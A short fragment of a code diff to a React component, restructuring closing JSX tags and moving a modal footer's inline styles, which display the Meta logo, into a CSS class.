-                                  </>
-                                )}
-                              </>
-                            )}
                           </>
                         )}
+                      </>
+                    )}
 
-                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
-                        </div>
+                    <div className="modal-meta-footer">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" />
                     </div>
                 </div>
-            )}
+            </div>
         </>
     );
 };
